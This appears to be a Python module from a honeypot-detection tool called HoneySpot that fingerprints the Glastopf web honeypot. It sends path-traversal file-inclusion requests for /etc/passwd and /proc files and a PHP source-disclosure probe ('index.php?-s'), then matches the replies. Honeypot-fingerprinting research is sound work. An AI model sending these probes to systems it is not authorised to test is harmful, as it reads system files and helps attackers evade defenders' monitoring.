""" This module is a part of HoneySpot project.
The module can be used to uncover Glastopf.
This is a work in progress and might give false results.
"""

#TODO: Add detection for hardcoded reply in RCE

import requests

__name__ = "Glastopf"
__proto__ = ["http"]
default_port = 80

# Terminal print codes
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'

session = requests.Session()

def run(target, port):
    port = port if port != 0 else default_port
    print "[+] Now running Glastopf module against - %s" % target
    url = "http://{}:{}/".format(target, port)
    lfi_proc_directory(url)
    source_disclosure(url)


def lfi_proc_directory(url):
    """ Exploiting issue #251 mentioned here - 
    https://github.com/mushorg/glastopf/issues/251
    """
    print "[+] Inside  lfi_proc_directory method."
    print "[+] Trying to fingerprint using LFI. https://github.com/mushorg/glastopf/issues/251"

    initial = "index.php?file=" + "/.." * 10 
    payload = initial + "/etc/passwd"
    match = "root:x:0:0:root:/root:/bin/bash"
    req = session.get(url + payload)
    if match in req.text:
        print FAIL + "\t[+] LFI detected. Now Checking /proc/ directory." + ENDC
        failed_to_open_msg = "Warning: include(vars1.php): failed to open stream"
        payload = initial + "/proc/version"
        match = "Warning: include(vars1.php): failed to open stream"
        req = session.get(url + payload)
        if failed_to_open_msg in req.text:
            print FAIL + "\t[+] Possible Glastopf instance detected! Failed to get /proc/version." + ENDC

        payload = initial + "/proc/meminfo"
        req = session.get(url + payload)
        if failed_to_open_msg in req.text:
            print FAIL + "\t[+] Possible Glastopf instance detected! Failed to get /proc/meminfo." + ENDC

def source_disclosure(url):
    print "[+] Inside source_disclosure method."
    payload = "index.php?-s"
    hardcoded_source = u'<code><span style="color: #000000">\n<span style="color: #0000BB">&lt;?php<br />' \
                        'page&nbsp;</span><span style="color: #007700">=&nbsp;</span><span style="color: #0000BB">' \
                        '$_GET</span><span style="color: #007700">[</span><span style="color: #DD0000">' \
                        '\'page\'</span><span style="color: #007700">];<br />include(</span>' \
                        '<span style="color: #0000BB">page</span><span style="color: #007700">);<br />' \
                        '</span><span style="color: #0000BB">?&gt;<br /></span>\n</span>'
    
    req = session.get(url + payload)
    if req.text == hardcoded_source:
        print FAIL + "\t[+] Hardcoded source code detected. Possibly Glastopf." + ENDC
